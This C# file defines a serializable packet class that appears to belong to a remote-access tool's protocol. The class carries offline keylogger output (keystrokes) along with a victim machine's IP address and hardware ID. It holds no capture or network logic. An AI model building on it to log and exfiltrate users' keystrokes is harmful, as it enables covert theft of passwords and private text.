using System;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace PacketLib.Packet
{
    [Serializable]
    public class KeylogOfflinePacket : IPacket
    {
        public KeylogOfflinePacket(string keyStroke, string baseIp, string HWID) : base()
        {
            this.PacketType = PacketType.KEYLOG_OFFLINE;
            this.keyStroke = keyStroke;
            this.BaseIp = baseIp;
            this.HWID = HWID;
        }

        public string HWID { get; set; }
        public string BaseIp { get; set; }
        public byte[] Plugin { get; set; }
        public PacketType PacketType { get; }
        public PacketState PacketState { get; set; }
        public string Status { get; set; }
        public string DatePacketStatus { get; set; }
        public int PacketSize { get; set; }

        public string keyStroke { get; set; }
    }
}
